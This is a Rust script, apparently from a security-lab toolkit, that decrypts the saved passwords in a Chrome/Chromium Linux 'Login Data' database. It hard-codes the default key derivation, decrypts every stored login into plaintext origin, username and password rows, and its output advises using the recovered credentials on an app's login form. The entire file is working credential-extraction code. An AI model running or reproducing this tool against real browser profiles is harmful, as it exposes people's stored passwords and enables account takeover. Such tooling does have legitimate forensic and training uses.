#!/usr/bin/env rust-script
//! name: chrome_logins
//! description: Decrypt a Chrome/Chromium Linux "Login Data" sqlite offline (v10/v11 = AES-128-CBC, key PBKDF2("peanuts","saltysalt",1,16), IV = bytes 3..19, legacy 16-byte plaintext prefix + PKCS7) and report origin/username/password rows, optionally filtered by host substring.
//! version: 1.0.1
//! args: <login-data-path> [--host SUBSTR] [--password SECRET]
//! keywords: chrome, chromium, password, login, decrypt, v10, cbc, aes, credential
//!
//! ```cargo
//! [dependencies]
//! rusqlite = { version = "0.31", features = ["bundled"] }
//! aes = "0.8"
//! cbc = { version = "0.1", features = ["alloc", "block-padding"] }
//! pbkdf2 = "0.12"
//! sha1 = "0.10"
//! ```

use cbc::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
use pi_rust_lib::serde_json::{json, Value};
use rusqlite::{Connection, OpenFlags};

type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

/// PBKDF2-HMAC-SHA1 over the OSCrypt "basic" password; 16-byte key for AES-128.
fn derive_key(password: &str) -> [u8; 16] {
    let mut key = [0u8; 16];
    pbkdf2::pbkdf2_hmac::<sha1::Sha1>(password.as_bytes(), b"saltysalt", 1, &mut key);
    key
}

fn decrypt(encrypted: &[u8], key: &[u8; 16]) -> Option<String> {
    if encrypted.len() < 19 || (&encrypted[..3] != b"v10" && &encrypted[..3] != b"v11") {
        return None;
    }
    let iv = &encrypted[3..19];
    let ct = &encrypted[19..];
    if ct.is_empty() || ct.len() % 16 != 0 {
        return None;
    }
    let mut buf = ct.to_vec();
    let plain = Aes128CbcDec::new_from_slices(key, iv).ok()?.decrypt_padded_mut::<Pkcs7>(&mut buf).ok()?;
    let body = if plain.len() > 16 { &plain[16..] } else { plain };
    Some(String::from_utf8_lossy(body).into_owned())
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut db = String::new();
    let mut host_filter: Option<String> = None;
    let mut password = "peanuts".to_string();

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--host" => {
                i += 1;
                if i < args.len() {
                    host_filter = Some(args[i].to_lowercase());
                }
            }
            "--password" => {
                i += 1;
                if i < args.len() {
                    password = args[i].clone();
                }
            }
            other if !other.starts_with("--") && db.is_empty() => db = other.to_string(),
            _ => {}
        }
        i += 1;
    }

    if db.is_empty() {
        pi_rust_lib::report::failure("chrome_logins", "missing Login Data path", "call as: chrome_logins <profile>/Default/Login Data [--host portswigger]"); // binding-exempt: documentation example domain in usage text, not a binding
        std::process::exit(2);
    }

    let key = derive_key(&password);
    let con = match Connection::open_with_flags(&db, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(e) => {
            pi_rust_lib::report::failure("chrome_logins", &format!("cannot open {db}: {e}"), "check the path points at a Chrome Login Data sqlite file");
            std::process::exit(1);
        }
    };

    let mut stmt = match con.prepare("select origin_url, username_value, password_value from logins") {
        Ok(s) => s,
        Err(e) => {
            pi_rust_lib::report::failure("chrome_logins", &format!("no logins table: {e}"), "is this a Chrome Login Data db?");
            std::process::exit(1);
        }
    };
    let rows = stmt.query_map([], |r| {
        Ok((
            r.get::<_, String>(0)?,
            r.get::<_, Option<String>>(1)?,
            r.get::<_, Option<Vec<u8>>>(2)?,
        ))
    });

    let mut hits: Vec<Value> = Vec::new();
    let mut total = 0usize;
    let mut undecrypted = 0usize;
    if let Ok(iter) = rows {
        for row in iter.flatten() {
            let (origin, user, pw) = row;
            total += 1;
            if let Some(filter) = &host_filter {
                if !origin.to_lowercase().contains(filter.as_str()) {
                    continue;
                }
            }
            let decrypted = pw.as_deref().and_then(|b| decrypt(b, &key));
            if pw.is_some() && decrypted.is_none() {
                undecrypted += 1;
            }
            hits.push(json!({
                "origin": origin,
                "username": user,
                "password": decrypted,
                "blob_len": pw.as_ref().map(|b| b.len()).unwrap_or(0),
            }));
        }
    }

    let _ = pi_rust_lib::report::success(
        "chrome_logins",
        json!({"db": db, "rows": total, "matched": hits.len(), "undecrypted": undecrypted, "logins": hits}),
        "use a decrypted credential for the app login form; password null = undecryptable blob",
    );
    std::process::exit(0);
}
